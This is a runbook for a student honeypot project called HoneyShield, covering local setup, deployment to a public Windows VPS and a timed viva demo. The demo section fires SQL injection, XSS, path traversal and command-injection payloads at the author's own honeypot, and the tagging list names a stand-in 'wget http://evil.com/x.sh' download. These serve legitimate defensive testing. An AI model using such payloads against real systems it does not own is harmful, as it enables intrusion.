# HoneyShield — Local Runbook

Everything needed to run, test, demo, and reset the project on this machine.

**Platform:** Windows 10/11 · Python 3.13 · Node 18+ · bash or cmd
**Project root:** `G:\MPN\MPN\HoneyShield`

---

## 0. One-time setup (already done on this machine, skip if rerunning)

```bash
cd /g/MPN/MPN/HoneyShield

# 1. Copy env template
cp .env.example .env

# 2. Create venv with Python 3.13
python -m venv venv

# 3. Install Python deps (skip psycopg2 — we use SQLite)
venv/Scripts/python.exe -m pip install --upgrade pip
venv/Scripts/python.exe -m pip install FastAPI==0.104.1 uvicorn==0.24.0 \
  "SQLAlchemy>=2.0.36" python-dotenv==1.0.0 Paramiko==3.3.1 \
  pycryptodome==3.19.0 requests==2.31.0 geoip2==4.8.0 PyYAML==6.0.1 \
  aiohttp aiofiles pytest pytest-asyncio python-dateutil

# 4. Initialize SQLite schema
venv/Scripts/python.exe -c "from database.connection import init_db; init_db()"

# 5. Install frontend deps (only if node_modules missing)
cd dashboard_frontend && npm install && cd ..
```

---

## 1. Start all services (3 background processes)

Open **three separate terminals** (or run in background from one):

### Terminal 1 — Honeypot engine
Runs SSH (2222), HTTP (8080), FTP (2121), Telnet (2323) concurrently.
```bash
cd /g/MPN/MPN/HoneyShield
venv/Scripts/python.exe -m honeypot_engine.engine
```

### Terminal 2 — Dashboard backend (FastAPI)
```bash
cd /g/MPN/MPN/HoneyShield
venv/Scripts/python.exe -m uvicorn dashboard_backend.main:app --host 127.0.0.1 --port 5000
```

### Terminal 3 — Dashboard frontend (React)
```bash
cd /g/MPN/MPN/HoneyShield/dashboard_frontend
set BROWSER=none && set PORT=3000 && npm start
```

---

## 2. URLs — where everything lives

| Service            | URL                                 | Purpose                           |
|--------------------|-------------------------------------|-----------------------------------|
| Dashboard UI       | http://localhost:3000               | React app, live map + feed        |
| Backend API root   | http://localhost:5000/api/stats     | JSON stats                        |
| SSH honeypot       | `ssh -p 2222 root@127.0.0.1`        | Any password captured             |
| HTTP honeypot      | http://localhost:8080               | Fake web server                   |
| FTP honeypot       | `ftp 127.0.0.1 2121`                | Fake FTP                          |
| Telnet honeypot    | `telnet 127.0.0.1 2323`             | Fake Telnet                       |

### Backend API endpoints (all GET)
```
/api/stats                         Overall counts
/api/attackers?limit=20            Top attacker IPs
/api/credentials?limit=50          Captured username/passwords
/api/protocols                     Protocol breakdown
/api/timeline?hours=24             Hourly attack counts
/api/geo-map                       Lat/lon pins for map
/api/events/recent?limit=20        Live threat feed
/api/http-requests?limit=20        Raw HTTP probes
/api/commands?limit=20             Shell commands captured
/api/sessions/{id}/commands        Session replay
```

---

## 3. Simulated attacks (generate real data)

Each script hits the live honeypot and produces new events in the DB.

```bash
cd /g/MPN/MPN/HoneyShield

venv/Scripts/python.exe tests/test_ssh.py       # 10 SSH brute-force attempts
venv/Scripts/python.exe tests/test_http.py      # 21 HTTP probes (SQLi, XSS, path traversal, .env, .git)
venv/Scripts/python.exe tests/test_ftp.py       # FTP login attempts
venv/Scripts/python.exe tests/test_telnet.py    # Telnet login attempts

# Full attack-simulator demo (runs multiple protocols)
venv/Scripts/python.exe tests/demo_attack_simulator.py

# Validate DB captured everything
venv/Scripts/python.exe tests/validate_db.py
```

### Run everything in one go
```bash
cd /g/MPN/MPN/HoneyShield/tests
run_all_tests.bat            # Windows
bash run_all_tests.sh        # Linux/macOS
```

---

## 4. Demo data seeders

All live attacks come from `127.0.0.1` which has no geolocation.
To make the world map light up with pins, seed fake public-IP events.

```bash
cd /g/MPN/MPN/HoneyShield
venv/Scripts/python.exe -m tests.seed_geo_demo
```

Seeds ~50–80 events across 10 countries (Russia, China, Germany, India, US, NL, UA, Brazil, South Africa, Japan) with real lat/lon.

---

## 5. Flush / reset

### Clear all captured data (keep schema, no restart needed)
```bash
cd /g/MPN/MPN/HoneyShield
venv/Scripts/python.exe -m tests.flush_db
```

### Nuke the whole DB file
```bash
cd /g/MPN/MPN/HoneyShield
# 1. Stop engine + backend first (Ctrl+C in their terminals)
rm honeypot.db
# 2. Re-init
venv/Scripts/python.exe -c "from database.connection import init_db; init_db()"
# 3. Restart engine + backend
```

---

## 6. Docker mode (alternative to local run)

```bash
cd /g/MPN/MPN/HoneyShield
docker-compose up -d        # Build + start all services
docker-compose ps           # Verify running
docker-compose logs -f      # Tail logs
docker-compose down         # Stop everything
```

---

## 7. Key files — what lives where

```
HoneyShield/
├── .env                          # ACTIVE config (created from .env.example)
├── config/config.yaml            # Service ports, protocols toggle
├── honeypot.db                   # SQLite — all captured data
├── requirements.txt              # Python deps
├── docker-compose.yml            # Docker orchestration
├── Dockerfile                    # Engine container
├── Dockerfile.backend            # API container
│
├── honeypot_engine/              # CORE — the actual honeypots
│   ├── engine.py                 # Multi-threaded runner (start with `-m honeypot_engine.engine`)
│   ├── base_service.py           # Shared server base class
│   ├── ssh_honeypot.py           # SSH service (port 2222)
│   ├── http_honeypot.py          # HTTP service (port 8080)
│   ├── ftp_honeypot.py           # FTP service (port 2121)
│   ├── telnet_honeypot.py        # Telnet service (port 2323)
│   └── virtual_fs.py             # Fake Linux filesystem
│
├── database/
│   ├── connection.py             # init_db(), get_db_manager()
│   └── models.py                 # attack_events, credentials, commands, sessions, geo_data
│
├── dashboard_backend/
│   └── main.py                   # FastAPI app — all /api/* endpoints
│
├── dashboard_frontend/
│   ├── package.json              # npm start → port 3000
│   ├── src/App.js                # React root
│   ├── src/api/dashboardAPI.js   # Axios client, points to localhost:5000
│   ├── src/pages/Dashboard.js    # Main dashboard page
│   └── src/components/           # AttackMap, LiveThreatFeed, TopAttackersTable, etc.
│
├── geo_service/
│   └── geolocation.py            # IP → lat/lon enrichment
│
└── tests/
    ├── test_ssh.py               # SSH brute-force simulator
    ├── test_http.py              # HTTP probe simulator
    ├── test_ftp.py               # FTP simulator
    ├── test_telnet.py            # Telnet simulator
    ├── demo_attack_simulator.py  # Combined scenario
    ├── seed_geo_demo.py          # Fake public-IP events for map demo
    ├── flush_db.py               # Clear all captured data
    ├── validate_db.py            # Sanity-check DB state
    ├── run_all_tests.bat         # Windows: run every simulator
    └── run_all_tests.sh          # Linux/macOS: run every simulator
```

---

## 8. Quick demo script (copy-paste ready)

```bash
# Clean slate
cd /g/MPN/MPN/HoneyShield
venv/Scripts/python.exe -m tests.flush_db

# Seed map with public-IP pins
venv/Scripts/python.exe -m tests.seed_geo_demo

# Fire live attacks (dashboard updates in real time)
venv/Scripts/python.exe tests/test_ssh.py
venv/Scripts/python.exe tests/test_http.py
venv/Scripts/python.exe tests/test_ftp.py
venv/Scripts/python.exe tests/test_telnet.py

# Open browser
start http://localhost:3000
```

---

## 9. Troubleshooting

| Symptom                                          | Fix                                                                 |
|--------------------------------------------------|---------------------------------------------------------------------|
| "Backend Connection Failed" banner               | Backend crashed — check Terminal 2 log, restart uvicorn             |
| Map is empty                                     | All attacks from 127.0.0.1 — run `tests/seed_geo_demo.py`           |
| `No module named 'database'` when running tests  | Use `-m tests.xxx` (module syntax), not `python tests/xxx.py`       |
| `test_http.py` opens Electron app                | Windows file assoc. Always use `venv/Scripts/python.exe tests/...`  |
| SQLAlchemy `AssertionError` on TypingOnly        | Using Py3.13 with old SQLAlchemy — upgrade to `>=2.0.36`            |
| `psycopg2-binary` fails to build                 | Skip it — project uses SQLite per `.env`                            |
| Port already in use (2222/8080/5000/3000)        | Stop stale process: `netstat -ano | findstr :PORT` then `taskkill /PID` |
| `/api/timeline` returns 500                      | Old code used PG `date_trunc()`; fixed to SQLite `strftime()`       |

---

## 10. Stop everything

If running in terminals: **Ctrl+C** in each.
If running in background (from this Claude session): they stop automatically on session end, or ask me to `TaskStop` them.

```bash
# Manual cleanup (Windows)
netstat -ano | findstr "LISTENING" | findstr ":2222 :8080 :2121 :2323 :5000 :3000"
taskkill /F /PID <pid>
```

---

## 11. VPS deployment — Windows Server 2022 (VPS IP: `195.250.20.9`)

Running HoneyShield on a public VPS exposes it to genuine attacker traffic. Real botnets (Mirai, Mozi), scanners (Shodan, Censys), and opportunistic attackers begin hitting a fresh public IPv4 within **5–15 minutes**.

> **Safety rule:** the VPS must be *dedicated*. No personal data, no reused SSH keys, no prod creds, no VPN link to your home/office network. Treat the machine as hostile after deployment.

The production VPS for this project is **Windows Server 2022 at `195.250.20.9`**. Every command below uses that IP — substitute yours if deploying a second instance.

### 11.1 Provider & cost notes

Windows Server licensing roughly doubles the cost vs Linux. Your VPS is already provisioned; for reference:

| Provider       | Windows Server 2022 plan | Typical cost/mo |
|----------------|--------------------------|-----------------|
| Contabo        | VPS M + Windows          | €10–15          |
| Vultr          | Cloud Compute + Windows  | $16+            |
| AWS Lightsail  | 2 GB Windows             | $17             |

### 11.2 First RDP login + Windows Firewall hardening

From your Windows PC: **Start → `mstsc`** → connect to `195.250.20.9:3389` → log in as Administrator with the password your provider gave you.

Change the admin password immediately (Ctrl+Alt+End → Change a password). Then open **PowerShell as Administrator** on the VPS:

```powershell
# Open honeypot + dashboard ports in Windows Firewall
New-NetFirewallRule -DisplayName "HoneyShield SSH"       -Direction Inbound -Protocol TCP -LocalPort 2222 -Action Allow
New-NetFirewallRule -DisplayName "HoneyShield HTTP"      -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow
New-NetFirewallRule -DisplayName "HoneyShield FTP"       -Direction Inbound -Protocol TCP -LocalPort 2121 -Action Allow
New-NetFirewallRule -DisplayName "HoneyShield Telnet"    -Direction Inbound -Protocol TCP -LocalPort 2323 -Action Allow
New-NetFirewallRule -DisplayName "HoneyShield Backend"   -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow
New-NetFirewallRule -DisplayName "HoneyShield Frontend"  -Direction Inbound -Protocol TCP -LocalPort 3000 -Action Allow

# Tighten RDP — require Network Level Authentication
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
                 -Name UserAuthentication -Value 1

# (Recommended) Restrict RDP to your home IP only — find yours at https://ifconfig.me
# Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -RemoteAddress <HOME_IP>
```

Also check the cloud provider's external firewall panel and mirror the same rules there.

### 11.3 Install Python 3.11, Node 20, Git, NSSM, sqlite3

Chocolatey is the easiest way to get everything on Windows Server:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = `
    [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
```

**Close and reopen** the Admin PowerShell window (so `choco` is on PATH), then:

```powershell
choco install -y python311 nodejs-lts git nssm sqlite

# Verify
python --version    # Python 3.11.x
node --version      # v20.x
git --version
nssm --version
sqlite3 --version
```

### 11.4 Get HoneyShield onto the VPS

**Option A — Git clone** (if repo is on GitHub/GitLab):
```powershell
cd C:\
git clone https://github.com/<you>/HoneyShield.git
cd C:\HoneyShield
```

**Option B — SCP from your local PC** (run from your *local* PowerShell, not the VPS):
```powershell
cd G:\MPN\MPN
scp -r HoneyShield Administrator@195.250.20.9:C:/
# Then RDP into the VPS and `cd C:\HoneyShield`
```

### 11.5 Install deps, init DB, build frontend

On the VPS, PowerShell inside `C:\HoneyShield`:

```powershell
copy .env.example .env
notepad .env   # set DB_TYPE=sqlite and a strong ADMIN_PASSWORD, then save

python -m venv venv
venv\Scripts\python -m pip install --upgrade pip
venv\Scripts\pip install FastAPI==0.104.1 uvicorn==0.24.0 "SQLAlchemy>=2.0.36" `
  python-dotenv==1.0.0 Paramiko==3.3.1 pycryptodome==3.19.0 requests==2.31.0 `
  geoip2==4.8.0 PyYAML==6.0.1 aiohttp aiofiles python-dateutil

venv\Scripts\python -c "from database.connection import init_db; init_db()"

cd dashboard_frontend
npm install
cd ..
```

### 11.6 Smoke test — 3 PowerShell windows

Verify everything works manually before wrapping as services.

**PS window 1 (engine):**
```powershell
cd C:\HoneyShield
venv\Scripts\python -m honeypot_engine.engine
# Expect: "SSH listening on 0.0.0.0:2222", HTTP on 8080, FTP on 2121, Telnet on 2323
```

**PS window 2 (backend):**
```powershell
cd C:\HoneyShield
venv\Scripts\python -m uvicorn dashboard_backend.main:app --host 0.0.0.0 --port 5000
```

**PS window 3 (frontend dev server — fine for demo):**
```powershell
cd C:\HoneyShield\dashboard_frontend
$env:REACT_APP_API_BASE = "http://195.250.20.9:5000/api"
$env:BROWSER = "none"
$env:PORT = "3000"
npm start
```

From your local PC, open **`http://195.250.20.9:3000/`** — dashboard should load and the counters should be live. If this works, `Ctrl+C` all three windows and continue to §11.7.

### 11.7 Install as Windows services (NSSM) — auto-start on reboot

In Admin PowerShell on the VPS:

```powershell
# Create a logs directory
New-Item -ItemType Directory -Path "C:\HoneyShield\logs" -ErrorAction SilentlyContinue

# Service 1 — honeypot engine
nssm install HoneyShieldEngine "C:\HoneyShield\venv\Scripts\python.exe" "-m honeypot_engine.engine"
nssm set HoneyShieldEngine AppDirectory "C:\HoneyShield"
nssm set HoneyShieldEngine Start SERVICE_AUTO_START
nssm set HoneyShieldEngine AppStdout "C:\HoneyShield\logs\engine.log"
nssm set HoneyShieldEngine AppStderr "C:\HoneyShield\logs\engine.err.log"
nssm start HoneyShieldEngine

# Service 2 — FastAPI backend
nssm install HoneyShieldBackend "C:\HoneyShield\venv\Scripts\python.exe" "-m uvicorn dashboard_backend.main:app --host 0.0.0.0 --port 5000"
nssm set HoneyShieldBackend AppDirectory "C:\HoneyShield"
nssm set HoneyShieldBackend Start SERVICE_AUTO_START
nssm set HoneyShieldBackend AppStdout "C:\HoneyShield\logs\backend.log"
nssm set HoneyShieldBackend AppStderr "C:\HoneyShield\logs\backend.err.log"
nssm start HoneyShieldBackend

# Service 3 — React frontend (NSSM can't easily pass env vars, so wrap in .cmd)
@'
@echo off
set REACT_APP_API_BASE=http://195.250.20.9:5000/api
set BROWSER=none
set PORT=3000
call npm start
'@ | Out-File -Encoding ascii C:\HoneyShield\dashboard_frontend\run-frontend.cmd

nssm install HoneyShieldFrontend "C:\HoneyShield\dashboard_frontend\run-frontend.cmd"
nssm set HoneyShieldFrontend AppDirectory "C:\HoneyShield\dashboard_frontend"
nssm set HoneyShieldFrontend Start SERVICE_AUTO_START
nssm set HoneyShieldFrontend AppStdout "C:\HoneyShield\logs\frontend.log"
nssm set HoneyShieldFrontend AppStderr "C:\HoneyShield\logs\frontend.err.log"
nssm start HoneyShieldFrontend

# Verify all three
Get-Service HoneyShield*
```

All three should report `Status: Running`. Dashboard now lives permanently at **`http://195.250.20.9:3000/`** and survives reboots.

### 11.8 Verify real-attack capture + operations

```powershell
# Live tail events as they land (run on the VPS inside C:\HoneyShield)
venv\Scripts\python -m tests.live_threat_watcher

# Count hits in the last hour
venv\Scripts\python -c "from database.connection import init_db, get_db_manager; from database.models import AttackEvent; from datetime import datetime, timedelta; init_db(); m=get_db_manager();
with m.get_db_session() as db:
    c = datetime.utcnow()-timedelta(hours=1)
    print(db.query(AttackEvent).filter(AttackEvent.timestamp>=c).count(), 'attacks in last hour')"
```

Common ops:

```powershell
# Tail service logs (each service has its own log file under C:\HoneyShield\logs\)
Get-Content C:\HoneyShield\logs\engine.log  -Tail 50 -Wait
Get-Content C:\HoneyShield\logs\backend.log -Tail 50 -Wait

# Restart after code update
cd C:\HoneyShield
git pull
nssm restart HoneyShieldEngine
nssm restart HoneyShieldBackend
nssm restart HoneyShieldFrontend

# Back up the DB
New-Item -ItemType Directory -Path C:\HoneyShield\backups -ErrorAction SilentlyContinue
copy C:\HoneyShield\honeypot.db "C:\HoneyShield\backups\honeypot-$(Get-Date -Format yyyy-MM-dd).db"

# Stop / remove a service
nssm stop   HoneyShieldEngine
nssm remove HoneyShieldEngine confirm
```

### 11.9 Do-not list

- No real creds, tokens, SSH keys, or business data on this VPS.
- No VPN / Tailscale / WireGuard bridge from this VPS into a trusted network.
- No shared admin password between this VPS and any other system.
- Don't "attack back" — passive logging is legal, retaliating is not.
- Windows Server has a bigger attack surface than Linux — keep Windows Update on and apply critical patches monthly.

---

## 12. Demonstration plan (final-year viva — 10–12 min)

Using the live VPS at **`http://195.250.20.9:3000/`**.

### 12.1 T-15 min pre-flight checklist

- [ ] RDP into VPS: services healthy? → `Get-Service HoneyShield*` → all three **Running**
- [ ] Browser: `http://195.250.20.9:3000/` loads, event count non-zero
- [ ] Map has public-IP pins (either organic traffic after ≥1 h, OR run `venv\Scripts\python -m tests.seed_geo_demo` on the VPS)
- [ ] Three windows arranged:
  1. **Browser** → `http://195.250.20.9:3000/`, full-screen on your demo machine
  2. **Terminal A** → RDP'd into VPS, running `venv\Scripts\python -m tests.live_threat_watcher`
  3. **Terminal B** → your local laptop at `g:\MPN\MPN\HoneyShield`, ready to fire attacks
- [ ] Notifications silenced, laptop plugged in, wifi stable
- [ ] Architecture slide open in background

### 12.2 Opening — 2 min

Say:
> "HoneyShield is a multi-protocol honeypot + threat intelligence dashboard. The VPS you see has been public-facing on `195.250.20.9` for N hours and has captured X real attacks from Y countries — every one a real attacker scanning the internet, not a simulation."

Point at the dashboard's total-events counter.

### 12.3 Architecture — 1 min

Single slide:
```
[Internet attackers] ──► 195.250.20.9 (Windows Server 2022)
                         ├─ :2222  SSH honeypot
                         ├─ :8080  HTTP honeypot
                         ├─ :2121  FTP honeypot
                         └─ :2323  Telnet honeypot
                                ▼
                    [Honeypot Engine (Python 3.11)]
                                ▼
                            [SQLite DB]
                         ▲              ▲
               [FastAPI :5000]   [Live Threat Watcher]
                         ▼
                  [React dashboard :3000]
```

### 12.4 Live capture — 3 min (the money shot)

From **Terminal B** (your local laptop inside `g:\MPN\MPN\HoneyShield`), fire attacks at the VPS. Every command below is copy-paste ready.

#### SSH brute-force
```powershell
# Any password is captured — demo by trying three
ssh -p 2222 root@195.250.20.9
ssh -p 2222 admin@195.250.20.9
ssh -p 2222 ubuntu@195.250.20.9
```

#### HTTP recon (benign paths — shows .env/.git/path probing)
```powershell
curl.exe http://195.250.20.9:8080/.env
curl.exe http://195.250.20.9:8080/.git/config
curl.exe http://195.250.20.9:8080/wp-admin/
curl.exe http://195.250.20.9:8080/phpmyadmin/
curl.exe http://195.250.20.9:8080/actuator/env
curl.exe http://195.250.20.9:8080/solr/admin/cores
```

#### HTTP attack payloads — the impressive ones

**SQL injection** — single-quote + space are already URL-encoded so this runs unmodified in any shell:
```powershell
curl.exe "http://195.250.20.9:8080/api/users?id=1'%20OR%201=1--"
```
Watcher tags it as **`T1190 SQL Injection / Exploit Public App`**.

**Cross-site scripting (XSS)** — `<` / `>` are special in both PowerShell and cmd.exe. **Use the URL-encoded form for portability** (works in any shell, any OS):
```powershell
curl.exe "http://195.250.20.9:8080/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
```

Literal form *also* works **in PowerShell only** when the whole URL is inside double-quotes (PowerShell reserves `<` `>` outside quotes, cmd.exe treats them as redirection even when quoted):
```powershell
# PowerShell only — DO NOT try this in cmd.exe
curl.exe "http://195.250.20.9:8080/?q=<script>alert(1)</script>"
```

URL-encoding cheatsheet for when you write your own payloads by hand:

| Character | Encoded  |    | Character | Encoded  |
|-----------|----------|----|-----------|----------|
| space     | `%20`    |    | `<`       | `%3C`    |
| `'`       | `%27`    |    | `>`       | `%3E`    |
| `"`       | `%22`    |    | `/`       | `%2F`    |
| `&`       | `%26`    |    | `=`       | `%3D`    |
| `;`       | `%3B`    |    | `#`       | `%23`    |

**Path traversal:**
```powershell
curl.exe "http://195.250.20.9:8080/../../etc/passwd"
curl.exe "http://195.250.20.9:8080/%2e%2e/%2e%2e/etc/passwd"
```

**Command-injection probe:**
```powershell
curl.exe "http://195.250.20.9:8080/ping?host=127.0.0.1%3Bwhoami"
```

#### Batch simulators — now accept `--host` / `--port`

The four test scripts take CLI arguments so you don't have to edit files anymore:
```powershell
cd g:\MPN\MPN\HoneyShield
venv\Scripts\python.exe tests\test_http.py   --host 195.250.20.9 --port 8080
venv\Scripts\python.exe tests\test_ssh.py    --host 195.250.20.9 --port 2222
venv\Scripts\python.exe tests\test_ftp.py    --host 195.250.20.9 --port 2121
venv\Scripts\python.exe tests\test_telnet.py --host 195.250.20.9 --port 2323
```

Running with no arguments still hits `localhost` — useful during local dev.

Within 2 seconds of each attack:
- **Dashboard map** → new pin at your home-PC location
- **Live Threat Feed** → new row scrolls in
- **Watcher on VPS** → event prints with MITRE tag + geo + full payload

### 12.5 Captured detail — 2 min

On the dashboard:
- Click a recent event → captured **username / password**
- Click the `/.env` probe → full raw **HTTP payload** (headers + body)
- Point at **Protocol breakdown** pie (SSH vs HTTP vs FTP vs Telnet)
- Point at **Top Attackers** table — some are real botnets hitting `195.250.20.9` *right now*, not scripted demos

### 12.6 MITRE ATT&CK angle — 1 min

In the watcher terminal every event is auto-tagged:
- `/etc/passwd`, `/.env`, `/.git/config` → **T1592 Gather Victim Information**
- `/api/users?id=1' OR 1=1--`          → **T1190 SQL Injection / Exploit Public App**
- `?q=<script>alert(1)</script>`        → **T1059.007 Cross-Site Scripting**
- `../../etc/passwd`                    → **T1083 Path Traversal**
- SSH login attempts                    → **T1110 Brute Force**
- `wget http://evil.com/x.sh`           → **T1105 Ingress Tool Transfer**

Line: *"Same taxonomy enterprise SOCs use. We're not inventing categories; we're mapping to the industry standard."*

### 12.7 Engineering depth — 1 min

Prove it's a real DB, not a mockup — run on the VPS:
```powershell
sqlite3 C:\HoneyShield\honeypot.db "SELECT ip, protocol, timestamp FROM attack_events ORDER BY id DESC LIMIT 5;"
```

Key decisions to name-drop:
- Thread-per-connection with async handlers (`honeypot_engine/base_service.py`)
- SQLAlchemy ORM — SQLite → Postgres is a connection-string change
- Reverse-proxy-aware IP extraction (`X-Forwarded-For` / `X-Real-IP`)
- MaxMind GeoLite2 enrichment for every event
- Real-time DB polling in watcher (2 s resolution)
- Deployed as 3 Windows services via NSSM — survives reboots

### 12.8 Closing — 1 min

What makes this project unique:
1. **Four protocols, one engine** — SSH + HTTP + FTP + Telnet
2. **Real internet data** — live on `195.250.20.9`, not seeded, not simulated
3. **Two views, one source of truth** — SOC terminal + web dashboard
4. **Automated MITRE tagging** on every event
5. **Reproducible demos** — flush + reseed + live in under a minute

### 12.9 Expected Q&A

| Question                                     | One-line answer                                                           |
|----------------------------------------------|---------------------------------------------------------------------------|
| Is this legal?                               | Yes — passive logging of traffic to your own server is legal worldwide.   |
| Can an attacker escape the honeypot?         | Protocols are emulated, no shell-exec path — worst case: the VPS, isolated. |
| Why SQLite, not Postgres?                    | Portability for demo; schema is Postgres-compatible via SQLAlchemy.       |
| Why Windows Server, not Linux?               | Matches what the hosting provider gave me; NSSM makes it clean.           |
| How would you scale this?                    | Postgres + pgBouncer, engine behind HAProxy, stream to Kafka + Elastic.   |
| Difference from Cowrie / Dionaea?            | Unified multi-protocol engine + live SOC dashboard + MITRE in one product.|
| False-positive rate?                         | Zero by definition — nothing legitimate should ever touch these ports.    |
| What if the panel asks to see source?        | Open `honeypot_engine/http_honeypot.py` — 180 lines, readable end-to-end. |
